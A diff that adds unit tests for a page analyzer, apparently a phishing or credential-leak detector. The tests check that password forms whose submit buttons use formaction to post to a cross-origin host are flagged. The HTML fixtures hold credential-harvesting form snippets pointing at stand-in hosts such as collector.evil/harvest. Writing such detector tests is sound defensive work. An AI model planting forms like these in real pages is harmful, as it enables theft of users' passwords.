@@ -63,6 +63,64 @@ describe("analyzePageContent", () => {
     expect(findings.crossOriginPasswordFormHosts).toEqual(["collector.evil"]);
   });
 
+  it("flags a submit-control formaction override that exfiltrates credentials", () => {
+    const findings = analyzePageContent(
+      `
+        <form action="/login">
+          <input type="password" name="pw">
+          <button formaction="https://collector.evil/harvest">Sign in</button>
+        </form>
+      `,
+      FINAL_URL,
+    );
+
+    expect(findings.crossOriginFormHosts).toEqual(["collector.evil"]);
+    expect(findings.crossOriginPasswordFormHosts).toEqual(["collector.evil"]);
+  });
+
+  it("inspects formaction overrides on actionless password forms", () => {
+    const findings = analyzePageContent(
+      `
+        <form>
+          <input type="password">
+          <input type="submit" formaction="https://collector.evil/steal">
+        </form>
+      `,
+      FINAL_URL,
+    );
+
+    expect(findings.crossOriginPasswordFormHosts).toEqual(["collector.evil"]);
+  });
+
+  it("ignores formaction on non-submit controls and honors form= binding", () => {
+    const findings = analyzePageContent(
+      `
+        <form id="login" action="/login"><input type="password"></form>
+        <button type="button" formaction="https://decoy.evil/x">Not a submit</button>
+        <button form="login" formaction="https://collector.evil/harvest">Sign in</button>
+      `,
+      FINAL_URL,
+    );
+
+    expect(findings.crossOriginFormHosts).toEqual(["collector.evil"]);
+    expect(findings.crossOriginPasswordFormHosts).toEqual(["collector.evil"]);
+  });
+
+  it("keeps same-origin formaction overrides local", () => {
+    const findings = analyzePageContent(
+      `
+        <form action="/login">
+          <input type="password">
+          <button formaction="/other-login">Sign in</button>
+        </form>
+      `,
+      FINAL_URL,
+    );
+
+    expect(findings.crossOriginFormHosts).toEqual([]);
+    expect(findings.crossOriginPasswordFormHosts).toEqual([]);
+  });
+
   it("resolves relative form actions against a cross-origin document base", () => {
     const findings = analyzePageContent(
       `<base href=https://evil.example/><form action=/collect><input type=password>`,
